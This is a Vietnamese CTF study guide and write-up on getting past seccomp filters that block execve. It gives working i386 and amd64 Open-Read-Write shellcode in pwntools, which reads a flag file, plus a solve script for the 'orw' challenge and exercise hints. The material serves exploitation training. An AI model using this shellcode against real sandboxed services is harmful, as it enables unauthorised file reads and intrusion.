# Seccomp & ORW — khi `execve` bị cấm, đọc thẳng flag

> Tài liệu học sâu. Shellcode ORW **verify logic bằng `run_shellcode`** (đọc được flag test;
> pwntools 4.15). Nguồn ở cuối.

---

## 1. Seccomp là gì?

**seccomp-bpf** là bộ lọc syscall: chương trình cài một chương trình BPF quyết định syscall nào
được phép. Rất hay gặp: **chặn `execve`/`execveat`** → không spawn được shell. Nhưng thường vẫn
cho **`open`/`openat` + `read` + `write`** → ta **đọc thẳng file flag** (kỹ thuật **ORW** =
Open-Read-Write), khỏi cần shell.

> Nói ngắn: *không gọi được `execve`? Thì `open("flag") → read → write(1)` in flag ra.*

---

## 2. Đọc bộ lọc: `seccomp-tools`

```bash
seccomp-tools dump ./chall        # chạy chall, in BPF filter
```
Ví dụ bài `orw` (i386):
```
 if (A == rt_sigreturn) goto ALLOW
 if (A == sigreturn)    goto ALLOW
 if (A == exit_group)   goto ALLOW
 if (A == exit)         goto ALLOW
 if (A == open)         goto ALLOW      <- ORW
 if (A == read)         goto ALLOW      <-
 if (A == write)        goto ALLOW      <-
 return ERRNO(38)                        <- còn lại: chặn (ENOSYS)
 ALLOW: return ALLOW
```
→ Cho `open/read/write` → **ORW**. (Nếu chỉ cho `openat` thì dùng `openat`; nếu cho `mmap/mprotect`
thì có thể còn hướng khác.) Luôn **đọc filter trước** để biết được gọi gì.

---

## 3. Shellcode ORW

Ba bước: `open(path, 0, 0)` → `read(fd, buf, n)` → `write(1, buf, n)`. **Số syscall khác nhau
giữa i386 và amd64:**

| | open | read | write | openat | execve | cơ chế |
|-|------|------|-------|--------|--------|--------|
| **i386** | 5 | 3 | 4 | 295 | 11 | `int 0x80`, args ở `ebx,ecx,edx` |
| **amd64** | 2 | 0 | 1 | 257 | 59 | `syscall`, args ở `rdi,rsi,rdx` |

**i386 (bài `orw`) — đã verify logic đọc được flag:**
```python
context.arch = 'i386'
p  = b"/home/orw/flag\0"                 # path đích, pad bội 4
p  = p.ljust((len(p)+3)//4*4, b"\0")
ch = [u32(p[i:i+4]) for i in range(0, len(p), 4)]
push = "".join(f"push {c}\n" for c in reversed(ch))   # đẩy ngược -> esp trỏ path
sc = asm(push + '''
    mov eax, 5          /* open  */
    mov ebx, esp        /* path  */
    xor ecx, ecx        /* flags=0 */
    xor edx, edx
    int 0x80
    mov ebx, eax        /* LƯU fd (eax) vào ebx TRƯỚC khi eax bị ghi đè */
    mov ecx, esp        /* buf   */
    mov edx, 0x100
    mov eax, 3          /* read  */
    int 0x80
    mov eax, 4          /* write */
    mov ebx, 1          /* fd=1 stdout */
    mov ecx, esp
    mov edx, 0x100
    int 0x80
''', arch='i386')
```

**amd64 tương đương:**
```python
context.arch='amd64'
sc = asm(shellcraft.amd64.linux.cat("/flag") , arch='amd64')   # gọn nhất nếu cho openat/read/write
# hoặc tự viết open/read/write với rax=2/0/1, nhớ: mov rdi,rax (lưu fd) trước khi set rax=0
```

---

## 4. Cạm bẫy (quan trọng)

- **LƯU `fd` ngay sau `open`.** `open` trả fd ở `eax`/`rax`; bước `read` lại set `eax=3`/`rax=0`
  → **mất fd**. Phải `mov ebx, eax` (i386) / `mov rdi, rax` (amd64) **trước**. (Chính lỗi này làm
  `shellcraft.read("eax",...)` dễ sai thứ tự — tự viết cho chắc.)
- **`open` vs `openat`.** Filter chỉ cho `openat` → đổi syscall (i386 295 / amd64 257), chữ ký
  `openat(AT_FDCWD=-100, path, flags, mode)`.
- **Đúng số syscall theo arch** (bảng §3). Nhầm i386↔amd64 là sai hết.
- **Buffer phải THỰC THI được.** Bài này đọc shellcode vào `.data` rồi `call` — trên kernel mới
  vùng đó **thường không exec** (SEGV_ACCERR) nếu không có `READ_IMPLIES_EXEC`; chạy đúng cần môi
  trường của đề (docker). → Mình **verify logic ORW bằng `run_shellcode`** (tạo vùng exec thật):
  ```python
  io = run_shellcode(sc); print(io.recvall(timeout=2))   # in ra nội dung flag
  ```
- **Không biết tên/đường dẫn flag** → đoán (`/flag`, `./flag`, tên bài), hoặc nếu cho `getdents`
  thì liệt kê thư mục trước.

---

## 5. Writeup bài `orw` (i386)

Binary `Give my your shellcode:` → `read(0, 0x804a060, 0xc8)` rồi `call 0x804a060`. Gửi shellcode
ORW ở §3 với path thật của đề (`/home/orw/flag`).

```python
#!/usr/bin/env python3
from pwn import *
from pwnld import *
context.binary = exe = ELF("./orw", checksec=False)   # i386, seccomp orw
p = start()
# (shellcode ORW như §3, path = /home/orw/flag)
sa("shellcode:", sc)
print(ra().decode(errors="replace"))     # đọc hết -> flag in ra
```

> Logic ORW đã verify đọc đúng file (`run_shellcode` in ra `FLAG{...}`). Trên máy ngoài môi trường
> đề, buffer `.data` không exec nên phải chạy trong docker của bài (hoặc bật READ_IMPLIES_EXEC).

Nếu đề là **ROP** (không nhồi shellcode) + seccomp: dựng ORW **bằng ROP** (set args + `syscall`
gadget cho open/read/write), hoặc [SROP](srop.md) từng syscall.

---

## 6. Danh sách bài tập + gợi ý

| Bài | Mức | Học gì | Gợi ý |
|-----|-----|--------|-------|
| **`Seccomp_Protection_Layer`** (orw, i386) | ⭐⭐ | đọc filter + ORW shellcode | **§5** (logic verify qua run_shellcode) |
| **amd64 ORW** | ⭐⭐ | số syscall amd64, `shellcraft.cat` | `shellcraft.amd64.linux.cat('/flag')` |
| **ORW bằng ROP** (NX bật) | ⭐⭐⭐ | open/read/write qua gadget + syscall | ghép [rop.md](pwntools/rop.md), [ret2csu](ret2csu.md) set args |
| **chỉ cho `openat`** | ⭐⭐⭐ | đổi syscall + `AT_FDCWD` | openat(-100, path, 0) |

**Lộ trình:** đọc filter (`seccomp-tools`) → ORW shellcode i386/amd64 → ORW-by-ROP khi NX bật →
biến thể openat/getdents.

---

## Nguồn tham khảo

- `seccomp-tools`: <https://github.com/david942j/seccomp-tools>
- HackTricks — *Seccomp*:
  <https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/seccomp>
- Sinh shellcode đa arch / né byte xấu: [shellcode.md](pwntools/shellcode.md), [advanced.md](pwntools/advanced.md#encoders--né-byte-xấu--shellcode-ascii)
